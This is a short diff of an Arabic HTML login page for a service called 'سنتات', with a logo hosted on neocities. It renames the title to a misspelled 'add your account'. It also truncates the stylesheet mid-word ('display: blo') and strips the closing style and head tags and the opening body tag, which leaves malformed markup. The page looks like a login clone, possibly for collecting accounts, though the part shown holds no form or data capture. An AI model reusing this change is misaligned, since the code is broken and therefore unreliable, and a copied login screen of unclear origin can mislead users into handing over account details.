@@ -6,7 +6,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تسجيل الدخول إلى سنتات</title>
+    <title>قم باضافه جسابك</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -46,14 +46,9 @@
             max-width: 300px;
             height: auto;
             margin: 10px auto;
-            display: block;
-        }
-    </style>
-</head>
-<body>
+            display: blo
 
     <h2>تسجيل الدخول إلى سنتات</h2>
-
     <!-- صورة الشعار -->
     <img src="https://sntat.neocities.org/Screenshot_%D9%A2%D9%A0%D9%A2%D9%A5%D9%A0%D9%A2%D9%A1%D9%A8-%D9%A2%D9%A3%D9%A4%D9%A8%D9%A2%D9%A3.jpg" alt="شعار سنتات" class="logo">
     
